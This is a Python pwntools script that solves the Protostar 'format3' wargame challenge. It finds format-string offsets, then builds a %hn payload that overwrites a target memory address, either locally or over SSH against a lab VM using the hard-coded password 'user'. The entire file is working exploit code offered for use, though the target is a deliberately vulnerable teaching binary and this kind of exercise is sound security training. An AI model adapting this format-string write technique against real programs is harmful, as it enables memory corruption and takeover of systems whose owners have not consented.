#!/usr/bin/env python
from pwn import *
import sys

targetAddr = 0x080496f4     # objdump -t format3 | grep target
desiredValue = 0x01025544
e = ELF('./format3')
def getOffsets():

    for i in range(50):
        payload = "AAAABBBBCCCCDDDD"
        payload += "%%%d$x" % i

        r = process([e.path])
        r.send(payload + "\n")
        response = r.recv(1024)
        print(str(i) +  " => " + response)
        r.close()

def testLocal():
    payload = p32(targetAddr)
    payload += p32(targetAddr+1)
    payload += p32(targetAddr+2)
    payload += "%56x%12$hn"
    payload += "%17x%13$hn"
    payload += "%173x%14$hn"
    r = process([e.path])
    r.send(payload+"\n")
    print(r.recv())
    r.close()


def exploit(ipAddr):
    s = ssh("user", ipAddr, 22, password="user")
    r = s.run('/opt/protostar/bin/format3')
    payload = p32(targetAddr)
    payload += p32(targetAddr+1)
    payload += p32(targetAddr+2)
    payload += "%56x%12$hn"
    payload += "%17x%13$hn"
    payload += "%173x%14$hn"
    r.send(payload + "\n")
    print(r.recv())
    r.close()

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
elif sys.argv[1] == "offset":
    getOffsets()
elif sys.argv[1] == "local":
    testLocal()
else:
    exploit(sys.argv[1])


